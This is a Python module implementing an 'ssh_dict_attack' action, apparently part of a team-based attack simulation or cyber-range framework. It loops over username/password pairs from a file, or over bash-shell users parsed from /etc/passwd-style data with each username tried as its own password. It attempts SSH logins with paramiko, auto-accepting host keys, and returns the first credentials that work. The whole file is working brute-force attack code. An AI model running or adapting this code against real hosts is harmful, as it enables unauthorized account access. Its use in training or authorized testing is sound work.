
#############################################################################
# "ssh_dict_attack" action implementing lightweight dictionary attack via SSH
#############################################################################

# Standard library imports
import sys

# Third party imports
import paramiko

# Local constants
FILE_KEY = "file"

SHELL_NAME = "bash"

COMMENT_SUCCESS = "SSH login succeeded"
COMMENT_FAILURE = "SSH login failed"

class ssh_dict_attack:
        
        # Check action parameters
	def check(self, action):

                # Only optional parameters, so no checking done
		return True

        # Execute action
	def action(self, team_name, address, action, data):

                # Handle first the case in which a file name is provided
                if FILE_KEY in action:
                        # Use file with comma-separated user names and passwords as input
                        try:
                                with open(action[FILE_KEY], "r") as f:
                                        data = f.readlines()
                        except IOError as error:
                                print("[-]: ssh_dict_attack: Cannot open user/password file: {0}".format(str(error)))
                                sys.exit(1)

                        # Proceed for each line in the file
                        for line in data:
                                user = line.split(",")[0].strip()
                                password = line.split(",")[1].strip()

                                client = paramiko.SSHClient()
                                # Normally we want warnings, but for our purposes auto-add policy is better 
                                #client.set_missing_host_key_policy(paramiko.WarningPolicy())
                                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                # Attempt to connect via SSH
                                try:
                                        # Set look_for_keys=False below to prevent the use of private keys,
                                        # as is causes "SSHException: No existing session" errors in paramiko
                                        client.connect(address, username=user, password=password, look_for_keys=False)
                                        client.close()
                                        break
                                except paramiko.ssh_exception.AuthenticationException:
                                        client.close()
                                        continue
                        # Executed in case the loop finishes without any "break" jump
                        else:
                                return False, COMMENT_FAILURE, {}

                        # If we reach this point, it means a "break" jump took place
                        return True, COMMENT_SUCCESS, {"user": user, "password": password}

                # Otherwise assume data contains user name information
                # TODO: Could use key/value to indicate data format (/etc/passwd, etc.)
                else:
			for line in data.split():

                                # Skip lines without a shell name
				if SHELL_NAME not in line:
					continue

                                # Retrieve user name
				user = line.split(":")[0]
                                # Set password to user name
                                # TODO: Too simple!!!
				password = user

                                # Set up the SSH client
				client = paramiko.SSHClient()
				client.set_missing_host_key_policy(paramiko.WarningPolicy())

                                # Try to connect
				try:
					client.connect(address,username=user,password=password)
					client.close()
					break
				except paramiko.ssh_exception.AuthenticationException:
					client.close()
					continue
                        # Executed in case the loop finishes without any "break" jump
			else:
				return False,COMMENT_FAILURE, {}

                        # If we reach this point, it means a "break" jump took place
                        return True, COMMENT_SUCCESS, {"user": user, "password": password}
